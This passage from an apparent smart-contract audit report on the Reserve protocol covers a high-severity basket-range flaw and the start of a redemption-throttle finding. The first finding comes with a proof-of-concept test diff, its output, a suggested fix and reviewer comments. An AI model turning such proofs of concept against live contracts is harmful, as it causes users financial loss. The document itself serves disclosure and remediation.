an unnecessary haircut to ~95%</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/plugins/assets/RTokenAsset.sol b/contracts/plugins/assets/RTokenAsset.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 62223442..03d3c3f4 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/plugins/assets/RTokenAsset.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/plugins/assets/RTokenAsset.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -123,7 +123,7 @@ contract RTokenAsset is IAsset {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // ==== Private ====</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function basketRange()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        private</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         returns (RecollateralizationLibP1.BasketRange memory range)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/Recollateralization.test.ts b/test/Recollateralization.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3c53fa30..386c0673 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/Recollateralization.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/Recollateralization.test.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -234,7 +234,42 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Issue rTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await rToken.connect(addr1)[&#39;issue(uint256)&#39;](issueAmount)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      it(&#39;PoC basket range&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let range = await rTokenAsset.basketRange();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let basketTokens = await basketHandler.basketTokens();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log({range}, {basketTokens});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Change the basket so that current balance would be 99 or 95 percent of</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // the new basket</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let q99PercentLess = 0.25 / 0.99;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let q95ercentLess = 0.25 / 0.95;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await basketHandler.connect(owner).setPrimeBasket(basketTokens, [fp(q99PercentLess),fp(q99PercentLess), fp(q95ercentLess), fp(q99PercentLess)])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await expect(basketHandler.connect(owner).refreshBasket())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        .to.emit(basketHandler, &#39;BasketSet&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        expect(await basketHandler.status()).to.equal(CollateralStatus.SOUND)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        expect(await basketHandler.fullyCollateralized()).to.equal(false)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        range = await rTokenAsset.basketRange();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // show the basket range is 95.9 to 99.9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log({range});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let needed = await rToken.basketsNeeded();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // show that prices are more or less the same</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let prices = await Promise.all( basket.map(x =&gt; x.price()));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Protocol would do a haircut even though it can easily do a trade</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await backingManager.manageTokens([]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // show how many baskets are left after the haircut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+         needed = await rToken.basketsNeeded();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+         </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log({prices, needed});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       it(&#39;Should select backup config correctly - Single backup token&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Register Collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await assetRegistry.connect(owner).register(backupCollateral1.address)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -602,7 +637,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         expect(quotes).to.eql([initialQuotes[0], initialQuotes[1], initialQuotes[3], bn(&#39;0.25e18&#39;)])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     context(&#39;With multiple targets&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let issueAmount: BigNumber</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let newEURCollateral: FiatCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -785,7 +820,7 @@ describe(`Recollateralization - P${IMPLEMENTATION}`, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   describe(&#39;Recollateralization&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     context(&#39;With very simple Basket - Single stablecoin&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       let issueAmount: BigNumber</span></span></span></code></pre>\n<p>Output (comments are added by me):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  range: [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    top: BigNumber { value: &quot;99947916501440267201&quot; },  //  99.9 basket units</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bottom: BigNumber { value: &quot;95969983506382791000&quot; } // 95.9 basket units</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  prices: [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;990000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;1010000000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;990000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;1010000000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;990000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;1010000000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;19800000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      BigNumber { value: &quot;20200000000000000&quot; }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  needed: BigNumber { value: &quot;94999999905000000094&quot; } // basket units after haircut: 94.9</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the formula so that we first calculate the ‘base’ (i.e. the min amount of baskets the RToken can satisfy without trading):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">base = basketsHeldBy(backingManager) // in the PoC&#39;s case it&#39;d be 95</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">(diffLowValue, diffHighValue) = (0,0) </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">for each collateral token:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    diff = collateralBalance - basketHandler.quantity(base) </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (diffLowValue, diffHighValue) = diff * (priceLow, priceHigh)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">addBasketsLow = diffLowValue / basketPriceHigh</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">addBasketHigh = diffHighValue / basketPriceLow</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">range.top = base + addBasketHigh</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">range.bottom = base + addBasketLow</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1400384608\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Would like sponsor to comment on this issue and will determine severity from there.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235\">tmattimore (Reserve) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1404082371\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Agree this behaves the way described. We’re aware of this problem and have been looking at fixes that are similar to the one suggested. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1409489804\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Thank you @tbrent - I think High seems correct here as this does directly lead to a loss of value for users.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235#issuecomment-1412311915\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>@0xean - Seems right.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR simplifies and improves the basket range formula. The new logic should provide much tighter basket range estimates and result in smaller haircuts.\n<a href=\"https://github.com/reserve-protocol/protocol/pull/585\">reserve-protocol/protocol#585</a></p>\n</blockquote>\n<p><strong>Status:</strong> Not fully mitigated. Full details in <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49\">report from 0xA5DF</a>, and also included in Mitigation Review section below.</p>\n<hr>\n<h1 id=\"medium-risk-findings-25\" style=\"position:relative;\"><a href=\"#medium-risk-findings-25\" aria-label=\"medium risk findings 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (25)</h1>\n<h2 id=\"m-01-battery-discharge-mechanism-doesnt-work-correctly-for-first-redemption\" style=\"position:relative;\"><a href=\"#m-01-battery-discharge-mechanism-doesnt-work-correctly-for-first-redemption\" aria-label=\"m 01 battery discharge mechanism doesnt work correctly for first redemption permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/452\">[M-01] Battery discharge mechanism doesn’t work correctly for first redemption</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/452\">AkshaySrivastav</a></em></p>\n<p>The <code>RTokenP1</code> contract implements a throttling mechanism using the <code>RedemptionBatteryLib</code> library. The library models a “battery” which “recharges” linearly block by block, over roughly 1 hour.</p>\n<p>RToken.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redeem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notFrozen</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk11\">discharge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supply</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// reverts on over-redemption</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>RedemptionBatteryLib.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">discharge</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Battery</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">redemptionRateFloor</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">scalingRedemptionRate</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// {qRTok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">charge</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">currentCharge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">battery</span><span class=\"mtk1\">, </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// A nice error message so people aren&#39;t confused why redemption failed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">charge</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;redemption battery insufficient&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Update battery</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastCharge</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">charge</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param supply {qRTok} Total RToken supply before the burn step</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @return charge {qRTok} The current total charge as an amount of RToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">currentCharge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Battery</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">charge</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// {qRTok/hour} = {qRTok} * D18{1/hour} / D18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtPerHour</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">scalingRedemptionRate</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">redemptionRateFloor</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">amtPerHour</span><span class=\"mtk1\">) </span><span class=\"mtk12\">amtPerHour</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">redemptionRateFloor</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// {blocks}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blocks</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">battery</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastBlock</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// {qRTok} = {qRTok} + {qRTok/hour} * {blocks} / {blocks/hour}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span 